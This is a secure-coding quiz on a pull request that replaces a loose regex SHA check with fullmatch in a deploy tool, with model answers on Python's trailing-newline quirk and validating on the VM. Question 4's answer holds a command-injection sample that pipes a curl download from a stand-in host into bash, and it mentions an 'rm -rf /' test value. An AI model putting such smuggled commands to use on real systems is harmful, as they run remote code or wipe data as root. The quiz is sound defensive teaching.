# Quiz 019 · PR #22 · Strict SHA check in the deploy tool

**How to take it (optional, ADR-022):** write your answer under each question, then open the model answer to compare. If you want a grade, tell Claude, who logs it in `docs/learning/quiz-log.md`.

---

## 1. What does this do?

What does `_SHA.fullmatch(sha)` accept that `re.match(r"^[0-9a-f]{40}$", sha)` didn't, and the other way round?

**Your answer:**

>

<details>
<summary>Model answer</summary>

`fullmatch` accepts exactly 40 lowercase hex characters and nothing else. The old pattern accepted the same strings **plus** one with a trailing newline (`<sha>\n`), because in Python's `re`, `$` matches at the very end *or just before a final newline*. Nothing valid is rejected by the new check.

</details>

## 2. What does this do?

Why does this check run on the laptop before anything is sent to AWS?

**Your answer:**

>

<details>
<summary>Model answer</summary>

The SHA is pasted into a shell line (`export SHA=…`) that the SSM agent runs **as root** on the production VM. Validating first, with an allow-list, means a malformed or hostile value never leaves the laptop. Any SSM call in the test fails it, which proves the check comes before the first AWS request.

</details>

## 3. What breaks if…

…the old check stays and someone runs `make deploy-ingest SHA="$(git rev-parse HEAD; echo)"`, which adds a newline?

**Your answer:**

>

<details>
<summary>Model answer</summary>

The SHA passes validation with a newline at the end. The image check URL and the `export` line then contain a newline: most likely the GHCR check fails (no such tag) and the deploy aborts, or the remote shell sees the newline as the end of the `export` command, so the variables after it aren't set. It's not arbitrary code execution, because the only extra character allowed is one newline at the very end. But "an allow-list that allows something you didn't list" is the kind of gap that grows into a real hole when code changes.

</details>

## 4. What breaks if…

…the pattern were `[0-9a-f]{40}` used with `re.search` instead of `fullmatch`?

**Your answer:**

>

<details>
<summary>Model answer</summary>

`search` finds the pattern **anywhere** in the string, so `x; curl evil.sh | bash; <40 hex chars>` would pass, and that payload would run as root on the VM. That's the worst choice of the three. The test's `"x; rm -rf /"` case alone wouldn't catch it; the `" " + SHA` case would.

</details>

## 5. How would you change it to…

…also protect the VM if someone ran `deploy/remote-deploy-ingest.sh` by hand, without the laptop tool?

**Your answer:**

>

<details>
<summary>Model answer</summary>

Validate again on the VM, at the top of the script: `[[ "$SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "bad SHA"; exit 2; }`. Bash's `=~` doesn't have Python's trailing-newline quirk for a value that comes from an environment variable. That's defense in depth: each side checks its own input instead of trusting the caller. It's worth it if anyone other than the laptop tool might run the script.

</details>
